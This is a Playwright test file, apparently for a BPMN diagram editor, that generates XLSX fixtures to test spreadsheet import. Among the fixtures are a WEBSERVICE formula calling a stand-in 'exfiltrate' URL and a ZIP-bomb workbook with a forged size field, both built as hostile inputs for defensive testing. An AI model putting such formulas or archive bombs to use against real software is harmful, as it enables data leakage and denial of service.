import { expect, test, type Locator, type Page } from '@playwright/test'
import { readFileSync } from 'node:fs'
import { dirname, resolve } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { strToU8, zipSync } from 'fflate'

const MANDATORY_SPREADSHEET_HERE = dirname(fileURLToPath(import.meta.url))
const MANDATORY_SPREADSHEET_DIST = resolve(MANDATORY_SPREADSHEET_HERE, '../../dist/index.html')
const MANDATORY_SPREADSHEET_URL = pathToFileURL(MANDATORY_SPREADSHEET_DIST).toString()
const MANDATORY_SPREADSHEET_XLSX_MIME =
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
const MANDATORY_SPREADSHEET_INPUT_LIMIT = 20 * 1024 * 1024
const MANDATORY_SPREADSHEET_EXPANSION_LIMIT = 100 * 1024 * 1024
const MANDATORY_SPREADSHEET_TEMPLATE_VERSION = '0.4.5.1'

/*
 * This is deliberately an independent consumer-side statement of the
 * published workbook contract. Import fixtures must fail when production
 * aliases/template generation drift from the documented schema.
 */
const MANDATORY_SPREADSHEET_OFFICIAL_HEADERS = Object.freeze({
  processes: Object.freeze([
    'process_id',
    'name_en',
    'name_ar',
    'description_en',
    'description_ar',
    'owner_en',
    'owner_ar',
    'folder',
    'active_language'
  ]),
  participants: Object.freeze([
    'process_id',
    'participant_id',
    'type',
    'parent_id',
    'order',
    'name_en',
    'name_ar'
  ]),
  steps: Object.freeze([
    'process_id',
    'step_id',
    'order',
    'type',
    'name_en',
    'name_ar',
    'pool_id',
    'lane_id',
    'participant_id',
    'owner_en',
    'owner_ar',
    'raci',
    'responsible_parties_en',
    'responsible_parties_ar',
    'channel_en',
    'channel_ar',
    'channel_detail_en',
    'channel_detail_ar',
    'inputs_en',
    'inputs_ar',
    'outputs_en',
    'outputs_ar',
    'cc_en',
    'cc_ar',
    'decision_basis_en',
    'decision_basis_ar',
    'triggers_en',
    'triggers_ar',
    'called_process_id',
    'event_definition',
    'notes_en',
    'notes_ar',
    'next_step_id',
    'next_step_ids'
  ]),
  flows: Object.freeze([
    'process_id',
    'flow_id',
    'source_step_id',
    'target_step_id',
    'condition_en',
    'condition_ar',
    'is_default'
  ]),
  glossary: Object.freeze(['english', 'arabic', 'do_not_translate', 'case_sensitive'])
})

type MandatorySpreadsheetPrimitive = string | number | boolean | null
interface MandatorySpreadsheetFormula {
  readonly formula: string
  readonly cached?: string | number | boolean
}
type MandatorySpreadsheetCell = MandatorySpreadsheetPrimitive | MandatorySpreadsheetFormula
type MandatorySpreadsheetRecord = Readonly<Record<string, MandatorySpreadsheetCell>>
type MandatorySpreadsheetSheetRole = keyof typeof MANDATORY_SPREADSHEET_OFFICIAL_HEADERS
type MandatorySpreadsheetWorkbookRows = Readonly<
  Partial<Record<MandatorySpreadsheetSheetRole, readonly MandatorySpreadsheetRecord[]>>
>
interface MandatorySpreadsheetRawSheet {
  readonly name: string
  readonly rows: readonly (readonly MandatorySpreadsheetCell[])[]
}

interface MandatorySpreadsheetWorkspaceOptions {
  readonly seed?: Readonly<Record<string, string>>
  /** Fail the numbered write whose destination filename ends in `.bpmn`. */
  readonly failBpmnWriteAt?: number
}

const MANDATORY_SPREADSHEET_SIMPLE_FLOWS: readonly MandatorySpreadsheetRecord[] = [
  {
    process_id: 'Process_simple',
    flow_id: 'Flow_simple_1',
    source_step_id: 'Start_simple',
    target_step_id: 'Task_simple',
    is_default: false
  },
  {
    process_id: 'Process_simple',
    flow_id: 'Flow_simple_2',
    source_step_id: 'Task_simple',
    target_step_id: 'End_simple',
    is_default: false
  }
]

const MANDATORY_SPREADSHEET_EXISTING_LINK_TARGET = `<?xml version="1.0" encoding="UTF-8"?>
<bpmn:definitions xmlns:bpmn="http://www.omg.org/spec/BPMN/20100524/MODEL"
  xmlns:bpmndi="http://www.omg.org/spec/BPMN/20100524/DI"
  xmlns:dc="http://www.omg.org/spec/DD/20100524/DC"
  id="Definitions_existing_review" targetNamespace="https://orbitpm.ae/tests">
  <bpmn:process id="Process_existing" name="Existing review" isExecutable="false">
    <bpmn:startEvent id="Start_existing" name="Existing start" />
  </bpmn:process>
  <bpmndi:BPMNDiagram id="Diagram_existing">
    <bpmndi:BPMNPlane id="Plane_existing" bpmnElement="Process_existing">
      <bpmndi:BPMNShape id="Start_existing_di" bpmnElement="Start_existing">
        <dc:Bounds x="180" y="160" width="36" height="36" />
      </bpmndi:BPMNShape>
    </bpmndi:BPMNPlane>
  </bpmndi:BPMNDiagram>
</bpmn:definitions>`

test.beforeAll(() => {
  const html = readFileSync(MANDATORY_SPREADSHEET_DIST, 'utf8')
  expect(html.length, 'dist/index.html should be a built single-file application').toBeGreaterThan(
    500_000
  )
})

function mandatorySpreadsheetXmlEscape(value: string): string {
  return value
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
}

function mandatorySpreadsheetColumnLetters(column: number): string {
  let current = column
  let output = ''
  while (current > 0) {
    current -= 1
    output = String.fromCharCode(65 + (current % 26)) + output
    current = Math.floor(current / 26)
  }
  return output
}

function mandatorySpreadsheetCellXml(
  value: MandatorySpreadsheetCell,
  row: number,
  column: number
): string {
  if (value === null || value === '') return ''
  const reference = `${mandatorySpreadsheetColumnLetters(column)}${row}`
  if (typeof value === 'object') {
    const formula = mandatorySpreadsheetXmlEscape(value.formula)
    if (value.cached === undefined) return `<c r="${reference}"><f>${formula}</f></c>`
    if (typeof value.cached === 'string') {
      return `<c r="${reference}" t="str"><f>${formula}</f><v>${mandatorySpreadsheetXmlEscape(value.cached)}</v></c>`
    }
    if (typeof value.cached === 'boolean') {
      return `<c r="${reference}" t="b"><f>${formula}</f><v>${value.cached ? '1' : '0'}</v></c>`
    }
    return `<c r="${reference}"><f>${formula}</f><v>${String(value.cached)}</v></c>`
  }
  if (typeof value === 'number') return `<c r="${reference}"><v>${String(value)}</v></c>`
  if (typeof value === 'boolean') {
    return `<c r="${reference}" t="b"><v>${value ? '1' : '0'}</v></c>`
  }
  const preserve = /^\s|\s$|\n/.test(value) ? ' xml:space="preserve"' : ''
  return `<c r="${reference}" t="inlineStr"><is><t${preserve}>${mandatorySpreadsheetXmlEscape(value)}</t></is></c>`
}

function mandatorySpreadsheetRawWorksheetXml(
  rows: readonly (readonly MandatorySpreadsheetCell[])[]
): string {
  return (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>' +
    rows
      .map(
        (values, rowIndex) =>
          `<row r="${rowIndex + 1}">` +
          values
            .map((value, columnIndex) =>
              mandatorySpreadsheetCellXml(value, rowIndex + 1, columnIndex + 1)
            )
            .join('') +
          '</row>'
      )
      .join('') +
    '</sheetData></worksheet>'
  )
}

function mandatorySpreadsheetWorkbookPackage(
  sheets: readonly MandatorySpreadsheetRawSheet[],
  options: {
    readonly official?: boolean
    readonly extraEntries?: Readonly<Record<string, string>>
  } = {}
): Uint8Array {
  const worksheetOverrides = sheets
    .map(
      (_, index) =>
        `<Override PartName="/xl/worksheets/sheet${index + 1}.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>`
    )
    .join('')
  const contentTypes =
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
    '<Default Extension="xml" ContentType="application/xml"/>' +
    '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>' +
    '<Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>' +
    worksheetOverrides +
    (options.official
      ? '<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>' +
        '<Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>' +
        '<Override PartName="/docProps/custom.xml" ContentType="application/vnd.openxmlformats-officedocument.custom-properties+xml"/>'
      : '') +
    '</Types>'
  const rootRelationships =
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>' +
    (options.official
      ? '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>' +
        '<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="docProps/app.xml"/>' +
        '<Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/custom-properties" Target="docProps/custom.xml"/>'
      : '') +
    '</Relationships>'
  const workbookRelationships =
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
    sheets
      .map(
        (_, index) =>
          `<Relationship Id="rId${index + 1}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet${index + 1}.xml"/>`
      )
      .join('') +
    `<Relationship Id="rId${sheets.length + 1}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>` +
    '</Relationships>'
  const workbook =
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">' +
    '<workbookPr date1904="false"/><sheets>' +
    sheets
      .map(
        ({ name }, index) =>
          `<sheet name="${mandatorySpreadsheetXmlEscape(name)}" sheetId="${index + 1}" r:id="rId${index + 1}"/>`
      )
      .join('') +
    '</sheets><calcPr calcId="0" fullCalcOnLoad="0"/></workbook>'
  const styles =
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">' +
    '<fonts count="1"><font><sz val="11"/><name val="Arial"/></font></fonts>' +
    '<fills count="2"><fill><patternFill patternType="none"/></fill><fill><patternFill patternType="gray125"/></fill></fills>' +
    '<borders count="1"><border><left/><right/><top/><bottom/><diagonal/></border></borders>' +
    '<cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs>' +
    '<cellXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/></cellXfs>' +
    '<cellStyles count="1"><cellStyle name="Normal" xfId="0" builtinId="0"/></cellStyles>' +
    '</styleSheet>'
  const archive: Record<string, Uint8Array> = {
    '[Content_Types].xml': strToU8(contentTypes),
    '_rels/.rels': strToU8(rootRelationships),
    'xl/workbook.xml': strToU8(workbook),
    'xl/_rels/workbook.xml.rels': strToU8(workbookRelationships),
    'xl/styles.xml': strToU8(styles)
  }
  for (const [index, sheet] of sheets.entries()) {
    archive[`xl/worksheets/sheet${index + 1}.xml`] = strToU8(
      mandatorySpreadsheetRawWorksheetXml(sheet.rows)
    )
  }
  if (options.official) {
    archive['docProps/core.xml'] = strToU8(
      '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
        '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">' +
        '<dc:creator>Independent mandatory fixture</dc:creator><cp:lastModifiedBy>Independent mandatory fixture</cp:lastModifiedBy>' +
        '<dcterms:created xsi:type="dcterms:W3CDTF">2026-01-01T00:00:00Z</dcterms:created>' +
        '<dcterms:modified xsi:type="dcterms:W3CDTF">2026-01-01T00:00:00Z</dcterms:modified>' +
        '</cp:coreProperties>'
    )
    archive['docProps/app.xml'] = strToU8(
      '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
        '<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">' +
        '<Application>Independent mandatory fixture</Application><AppVersion>1.0</AppVersion></Properties>'
    )
    archive['docProps/custom.xml'] = strToU8(
      '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
        '<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">' +
        `<property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="2" name="OrbitPMTemplateVersion"><vt:lpwstr>${MANDATORY_SPREADSHEET_TEMPLATE_VERSION}</vt:lpwstr></property>` +
        '<property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="OrbitPMTemplateKind"><vt:lpwstr>blank</vt:lpwstr></property>' +
        '</Properties>'
    )
  }
  for (const [path, contents] of Object.entries(options.extraEntries ?? {})) {
    archive[path] = strToU8(contents)
  }
  return zipSync(archive, { level: 0 })
}

function mandatorySpreadsheetOfficialWorkbook(
  rows: MandatorySpreadsheetWorkbookRows,
  options: { readonly extraEntries?: Readonly<Record<string, string>> } = {}
): Uint8Array {
  const orderedRoles: readonly MandatorySpreadsheetSheetRole[] = [
    'processes',
    'participants',
    'steps',
    'flows',
    'glossary'
  ]
  return mandatorySpreadsheetWorkbookPackage(
    orderedRoles.map((role) => {
      const headers = MANDATORY_SPREADSHEET_OFFICIAL_HEADERS[role]
      return {
        name: `${role.charAt(0).toUpperCase()}${role.slice(1)}`,
        rows: [
          headers,
          ...(rows[role] ?? []).map((record) => headers.map((header) => record[header] ?? null))
        ]
      }
    }),
    { official: true, extraEntries: options.extraEntries }
  )
}

function mandatorySpreadsheetOrdinaryMappingWorkbook(): Uint8Array {
  return mandatorySpreadsheetWorkbookPackage([
    {
      name: 'Cover',
      rows: [
        ['OrbitPM independent ordinary-workbook fixture'],
        ['This sheet deliberately has no mapping headers']
      ]
    },
    {
      name: 'Ops Register',
      rows: [
        ['Operations register — title row'],
        [
          'Workflow ID',
          'Step ID',
          'Sequence Number',
          'Activity Category Type',
          'English Name',
          'Arabic Name',
          'Inputs EN',
          'Inputs AR'
        ],
        [
          'Process_ordinary',
          'Task_receive',
          10,
          'user task',
          'Receive request',
          'استلام الطلب',
          'Request form|Attachments',
          'نموذج الطلب|المرفقات'
        ],
        [
          'Process_ordinary',
          '',
          20,
          'Mystery work',
          'Assess request',
          'تقييم الطلب',
          'Policy|Evidence',
          'السياسة|الأدلة'
        ],
        [
          'Process_ordinary',
          'Task_archive',
          30,
          'service task',
          'Archive request',
          'أرشفة الطلب',
          'Record|Receipt',
          'السجل|الإيصال'
        ]
      ]
    }
  ])
}

function mandatorySpreadsheetSimpleWorkbook(
  language: 'en' | 'ar' | 'bilingual',
  options: {
    readonly orderFormula?: 'cached' | 'missing-cache'
    readonly records?: MandatorySpreadsheetWorkbookRows
  } = {}
): Uint8Array {
  const english = language !== 'ar'
  const arabic = language !== 'en'
  const process: MandatorySpreadsheetRecord = {
    process_id: 'Process_simple',
    name_en: english ? 'Simple approval' : '',
    name_ar: arabic ? 'الموافقة البسيطة' : '',
    description_en: english ? 'A deterministic spreadsheet process.' : '',
    description_ar: arabic ? 'عملية جداول بيانات حتمية.' : '',
    folder: 'Examples',
    active_language: language === 'ar' ? 'ar' : 'en'
  }
  const stepName = (
    id: 'start' | 'task' | 'end'
  ): Pick<MandatorySpreadsheetRecord, 'name_en' | 'name_ar'> => {
    const values = {
      start: ['Start', 'البداية'],
      task: ['Review request', 'مراجعة الطلب'],
      end: ['End', 'النهاية']
    } as const
    return {
      name_en: english ? values[id][0] : '',
      name_ar: arabic ? values[id][1] : ''
    }
  }
  const taskOrder: MandatorySpreadsheetCell =
    options.orderFormula === 'cached'
      ? { formula: 'WEBSERVICE("https://formula.invalid/exfiltrate")', cached: 37 }
      : options.orderFormula === 'missing-cache'
        ? { formula: 'WEBSERVICE("https://formula.invalid/missing-cache")' }
        : 2
  return mandatorySpreadsheetOfficialWorkbook({
    processes: [process],
    steps: [
      {
        process_id: 'Process_simple',
        step_id: 'Start_simple',
        order: 1,
        type: 'startEvent',
        ...stepName('start')
      },
      {
        process_id: 'Process_simple',
        step_id: 'Task_simple',
        order: taskOrder,
        type: 'userTask',
        ...stepName('task'),
        notes_en: english ? 'Review every field.' : '',
        notes_ar: arabic ? 'راجع كل حقل.' : ''
      },
      {
        process_id: 'Process_simple',
        step_id: 'End_simple',
        order: 3,
        type: 'endEvent',
        ...stepName('end')
      }
    ],
    flows: MANDATORY_SPREADSHEET_SIMPLE_FLOWS,
    ...options.records
  })
}

function mandatorySpreadsheetComplexWorkbook(): Uint8Array {
  return mandatorySpreadsheetOfficialWorkbook({
    processes: [
      {
        process_id: 'Process_linker',
        name_en: 'Linked review',
        name_ar: 'المراجعة المرتبطة',
        description_en: 'Calls the reusable review process.',
        description_ar: 'يستدعي عملية المراجعة القابلة لإعادة الاستخدام.',
        owner_en: 'Operations',
        owner_ar: 'العمليات',
        folder: 'Ops/Links',
        active_language: 'en'
      },
      {
        process_id: 'Process_main',
        name_en: 'Main approval',
        name_ar: 'الموافقة الرئيسية',
        description_en: 'Routes a request and calls a shared review.',
        description_ar: 'يوجه الطلب ويستدعي مراجعة مشتركة.',
        owner_en: 'Operations',
        owner_ar: 'العمليات',
        folder: 'Ops/Intake',
        active_language: 'en'
      },
      {
        process_id: 'Process_child',
        name_en: 'Shared review',
        name_ar: 'المراجعة المشتركة',
        description_en: 'Performs the reusable review.',
        description_ar: 'ينفذ المراجعة القابلة لإعادة الاستخدام.',
        owner_en: 'Quality',
        owner_ar: 'الجودة',
        folder: 'Ops/Shared',
        active_language: 'en'
      }
    ],
    participants: [
      {
        process_id: 'Process_main',
        participant_id: 'Pool_main',
        type: 'pool',
        order: 1,
        name_en: 'Main approval',
        name_ar: 'الموافقة الرئيسية'
      },
      {
        process_id: 'Process_main',
        participant_id: 'Lane_requester',
        type: 'lane',
        parent_id: 'Pool_main',
        order: 1,
        name_en: 'Requester',
        name_ar: 'مقدم الطلب'
      },
      {
        process_id: 'Process_main',
        participant_id: 'Lane_reviewer',
        type: 'lane',
        parent_id: 'Pool_main',
        order: 2,
        name_en: 'Reviewer',
        name_ar: 'المراجع'
      },
      {
        process_id: 'Process_child',
        participant_id: 'Pool_child',
        type: 'pool',
        order: 1,
        name_en: 'Shared quality review',
        name_ar: 'مراجعة الجودة المشتركة'
      },
      {
        process_id: 'Process_child',
        participant_id: 'Lane_quality',
        type: 'lane',
        parent_id: 'Pool_child',
        order: 1,
        name_en: 'Quality reviewer',
        name_ar: 'مراجع الجودة'
      }
    ],
    steps: [
      {
        process_id: 'Process_linker',
        step_id: 'Start_linker',
        order: 1,
        type: 'startEvent',
        name_en: 'Link started',
        name_ar: 'بدء الارتباط'
      },
      {
        process_id: 'Process_linker',
        step_id: 'Call_linker_child',
        order: 2,
        type: 'callActivity',
        name_en: 'Run shared review',
        name_ar: 'تنفيذ المراجعة المشتركة',
        called_process_id: 'Process_existing'
      },
      {
        process_id: 'Process_linker',
        step_id: 'End_linker',
        order: 3,
        type: 'endEvent',
        name_en: 'Link completed',
        name_ar: 'اكتمال الارتباط'
      },
      {
        process_id: 'Process_main',
        step_id: 'Start_main',
        order: 1,
        type: 'startEvent',
        name_en: 'Request received',
        name_ar: 'استلام الطلب',
        pool_id: 'Pool_main',
        lane_id: 'Lane_requester'
      },
      {
        process_id: 'Process_main',
        step_id: 'Task_main_prepare',
        order: 2,
        type: 'userTask',
        name_en: 'Prepare request',
        name_ar: 'إعداد الطلب',
        pool_id: 'Pool_main',
        lane_id: 'Lane_requester',
        inputs_en: 'Request form',
        inputs_ar: 'نموذج الطلب',
        outputs_en: 'Prepared request',
        outputs_ar: 'الطلب المعد'
      },
      {
        process_id: 'Process_main',
        step_id: 'Gateway_main',
        order: 3,
        type: 'exclusiveGateway',
        name_en: 'Ready for review?',
        name_ar: 'هل الطلب جاهز للمراجعة؟',
        pool_id: 'Pool_main',
        lane_id: 'Lane_reviewer'
      },
      {
        process_id: 'Process_main',
        step_id: 'Task_main_review',
        order: 4,
        type: 'userTask',
        name_en: 'Run local review',
        name_ar: 'تنفيذ المراجعة المحلية',
        pool_id: 'Pool_main',
        lane_id: 'Lane_reviewer'
      },
      {
        process_id: 'Process_main',
        step_id: 'Task_main_rework',
        order: 4,
        type: 'task',
        name_en: 'Rework request',
        name_ar: 'إعادة إعداد الطلب',
        pool_id: 'Pool_main',
        lane_id: 'Lane_requester'
      },
      {
        process_id: 'Process_main',
        step_id: 'End_main',
        order: 5,
        type: 'endEvent',
        name_en: 'Request completed',
        name_ar: 'اكتمال الطلب',
        pool_id: 'Pool_main',
        lane_id: 'Lane_reviewer'
      },
      {
        process_id: 'Process_child',
        step_id: 'Start_child',
        order: 1,
        type: 'startEvent',
        name_en: 'Review started',
        name_ar: 'بدء المراجعة',
        pool_id: 'Pool_child',
        lane_id: 'Lane_quality'
      },
      {
        process_id: 'Process_child',
        step_id: 'Task_child_review',
        order: 2,
        type: 'businessRuleTask',
        name_en: 'Check quality rules',
        name_ar: 'التحقق من قواعد الجودة',
        pool_id: 'Pool_child',
        lane_id: 'Lane_quality',
        decision_basis_en: 'Quality policy',
        decision_basis_ar: 'سياسة الجودة'
      },
      {
        process_id: 'Process_child',
        step_id: 'End_child',
        order: 3,
        type: 'endEvent',
        name_en: 'Review completed',
        name_ar: 'اكتمال المراجعة',
        pool_id: 'Pool_child',
        lane_id: 'Lane_quality'
      }
    ],
    flows: [
      {
        process_id: 'Process_linker',
        flow_id: 'Flow_linker_1',
        source_step_id: 'Start_linker',
        target_step_id: 'Call_linker_child',
        is_default: false
      },
      {
        process_id: 'Process_linker',
        flow_id: 'Flow_linker_2',
        source_step_id: 'Call_linker_child',
        target_step_id: 'End_linker',
        is_default: false
      },
      {
        process_id: 'Process_main',
        flow_id: 'Flow_main_1',
        source_step_id: 'Start_main',
        target_step_id: 'Task_main_prepare',
        is_default: false
      },
      {
        process_id: 'Process_main',
        flow_id: 'Flow_main_2',
        source_step_id: 'Task_main_prepare',
        target_step_id: 'Gateway_main',
        is_default: false
      },
      {
        process_id: 'Process_main',
        flow_id: 'Flow_main_review',
        source_step_id: 'Gateway_main',
        target_step_id: 'Task_main_review',
        condition_en: 'Ready',
        condition_ar: 'جاهز',
        is_default: false
      },
      {
        process_id: 'Process_main',
        flow_id: 'Flow_main_default',
        source_step_id: 'Gateway_main',
        target_step_id: 'Task_main_rework',
        is_default: true
      },
      {
        process_id: 'Process_main',
        flow_id: 'Flow_main_3',
        source_step_id: 'Task_main_review',
        target_step_id: 'End_main',
        is_default: false
      },
      {
        process_id: 'Process_main',
        flow_id: 'Flow_main_4',
        source_step_id: 'Task_main_rework',
        target_step_id: 'End_main',
        is_default: false
      },
      {
        process_id: 'Process_child',
        flow_id: 'Flow_child_1',
        source_step_id: 'Start_child',
        target_step_id: 'Task_child_review',
        is_default: false
      },
      {
        process_id: 'Process_child',
        flow_id: 'Flow_child_2',
        source_step_id: 'Task_child_review',
        target_step_id: 'End_child',
        is_default: false
      }
    ],
    glossary: [
      {
        english: 'SLA',
        arabic: 'SLA',
        do_not_translate: true,
        case_sensitive: true
      }
    ]
  })
}

function mandatorySpreadsheetValidationWorkbook(
  kind:
    | 'missing-id'
    | 'duplicate-id'
    | 'broken-reference'
    | 'unknown-type'
    | 'circular-lanes'
    | 'invalid-defaults'
): Uint8Array {
  const processId = `Process_matrix_${kind.replaceAll('-', '_')}`
  const baseProcesses: readonly MandatorySpreadsheetRecord[] = [
    {
      process_id: processId,
      name_en: 'Validation matrix',
      name_ar: 'مصفوفة التحقق',
      active_language: 'en'
    }
  ]
  const baseSteps: readonly MandatorySpreadsheetRecord[] = [
    {
      process_id: processId,
      step_id: 'Start_matrix',
      order: 1,
      type: 'startEvent',
      name_en: 'Start',
      name_ar: 'البداية'
    },
    {
      process_id: processId,
      step_id: 'Task_matrix',
      order: 2,
      type: 'task',
      name_en: 'Review',
      name_ar: 'مراجعة'
    },
    {
      process_id: processId,
      step_id: 'End_matrix',
      order: 3,
      type: 'endEvent',
      name_en: 'End',
      name_ar: 'النهاية'
    }
  ]
  const baseFlows: readonly MandatorySpreadsheetRecord[] = [
    {
      process_id: processId,
      flow_id: 'Flow_matrix_1',
      source_step_id: 'Start_matrix',
      target_step_id: 'Task_matrix',
      is_default: false
    },
    {
      process_id: processId,
      flow_id: 'Flow_matrix_2',
      source_step_id: 'Task_matrix',
      target_step_id: 'End_matrix',
      is_default: false
    }
  ]
  if (kind === 'missing-id') {
    return mandatorySpreadsheetOfficialWorkbook({
      processes: baseProcesses,
      steps: [baseSteps[0]!, { ...baseSteps[1]!, step_id: '' }, baseSteps[2]!],
      flows: []
    })
  }
  if (kind === 'duplicate-id') {
    return mandatorySpreadsheetOfficialWorkbook({
      processes: baseProcesses,
      steps: [baseSteps[0]!, baseSteps[1]!, { ...baseSteps[2]!, step_id: 'Task_matrix' }],
      flows: baseFlows
    })
  }
  if (kind === 'broken-reference') {
    return mandatorySpreadsheetOfficialWorkbook({
      processes: baseProcesses,
      steps: baseSteps,
      flows: [baseFlows[0]!, { ...baseFlows[1]!, target_step_id: 'Missing_matrix' }]
    })
  }
  if (kind === 'unknown-type') {
    return mandatorySpreadsheetOfficialWorkbook({
      processes: baseProcesses,
      steps: [baseSteps[0]!, { ...baseSteps[1]!, type: 'Mystery work' }, baseSteps[2]!],
      flows: baseFlows
    })
  }
  if (kind === 'circular-lanes') {
    return mandatorySpreadsheetOfficialWorkbook({
      processes: baseProcesses,
      participants: [
        {
          process_id: processId,
          participant_id: 'Pool_matrix',
          type: 'pool',
          name_en: 'Matrix pool',
          name_ar: 'حوض المصفوفة'
        },
        {
          process_id: processId,
          participant_id: 'Lane_matrix_a',
          type: 'lane',
          parent_id: 'Lane_matrix_b',
          name_en: 'Lane A',
          name_ar: 'المسار أ'
        },
        {
          process_id: processId,
          participant_id: 'Lane_matrix_b',
          type: 'lane',
          parent_id: 'Lane_matrix_a',
          name_en: 'Lane B',
          name_ar: 'المسار ب'
        }
      ],
      steps: baseSteps,
      flows: baseFlows
    })
  }
  return mandatorySpreadsheetOfficialWorkbook({
    processes: baseProcesses,
    steps: [
      baseSteps[0]!,
      {
        ...baseSteps[1]!,
        step_id: 'Gateway_matrix',
        type: 'exclusiveGateway',
        name_en: 'Choose route',
        name_ar: 'اختيار المسار'
      },
      {
        ...baseSteps[1]!,
        step_id: 'Task_matrix_a',
        order: 3,
        name_en: 'Route A',
        name_ar: 'المسار أ'
      },
      {
        ...baseSteps[1]!,
        step_id: 'Task_matrix_b',
        order: 3,
        name_en: 'Route B',
        name_ar: 'المسار ب'
      },
      { ...baseSteps[2]!, order: 4 }
    ],
    flows: [
      {
        process_id: processId,
        flow_id: 'Flow_matrix_start',
        source_step_id: 'Start_matrix',
        target_step_id: 'Gateway_matrix',
        is_default: false
      },
      {
        process_id: processId,
        flow_id: 'Flow_matrix_default_a',
        source_step_id: 'Gateway_matrix',
        target_step_id: 'Task_matrix_a',
        condition_en: 'First',
        condition_ar: 'الأول',
        is_default: true
      },
      {
        process_id: processId,
        flow_id: 'Flow_matrix_default_b',
        source_step_id: 'Gateway_matrix',
        target_step_id: 'Task_matrix_b',
        is_default: true
      },
      {
        process_id: processId,
        flow_id: 'Flow_matrix_end_a',
        source_step_id: 'Task_matrix_a',
        target_step_id: 'End_matrix',
        is_default: false
      },
      {
        process_id: processId,
        flow_id: 'Flow_matrix_end_b',
        source_step_id: 'Task_matrix_b',
        target_step_id: 'End_matrix',
        is_default: false
      }
    ]
  })
}

function mandatorySpreadsheetReplaceAscii(
  source: Uint8Array,
  from: string,
  to: string
): Uint8Array {
  if (from.length !== to.length) throw new Error('ZIP path replacements must preserve length')
  const output = source.slice()
  const before = Buffer.from(from, 'ascii')
  const after = Buffer.from(to, 'ascii')
  for (let offset = 0; offset <= output.length - before.length; offset += 1) {
    let matches = true
    for (let index = 0; index < before.length; index += 1) {
      if (output[offset + index] !== before[index]) {
        matches = false
        break
      }
    }
    if (!matches) continue
    output.set(after, offset)
    offset += before.length - 1
  }
  return output
}

function mandatorySpreadsheetBombWorkbook(): Uint8Array {
  const output = mandatorySpreadsheetOfficialWorkbook({}).slice()
  const view = new DataView(output.buffer, output.byteOffset, output.byteLength)
  for (let offset = 0; offset <= output.length - 46; offset += 1) {
    if (view.getUint32(offset, true) !== 0x02014b50) continue
    view.setUint32(offset + 24, MANDATORY_SPREADSHEET_EXPANSION_LIMIT + 1, true)
    return output
  }
  throw new Error('Official workbook did not contain a ZIP central-directory entry')
}

async function mandatorySpreadsheetForceSingleFile(page: Page): Promise<void> {
  await page.addInitScript(() => {
    delete window.showDirectoryPicker
    delete window.showOpenFilePicker
  })
}

async function mandatorySpreadsheetOpenPanel(page: Page): Promise<Locator> {
  const blank = page.getByRole('button', { name: /New blank diagram/i })
  // On a slow boot the landing actions may not have rendered yet; probe with a
  // bounded wait instead of a one-shot isVisible so the editor entry is not
  // skipped. The catch branch keeps the already-in-editor flow intact.
  const blankVisible = await blank
    .waitFor({ state: 'visible', timeout: 10_000 })
    .then(() => true)
    .catch(() => false)
  if (blankVisible) {
    await blank.click()
    await expect(page.locator('.djs-container svg').first()).toBeVisible({ timeout: 30_000 })
  }
  const sidePanel = page.locator('aside')
  if (!(await sidePanel.isVisible().catch(() => false))) {
    await page.getByRole('button', { name: 'Toggle side panel' }).click()
  }
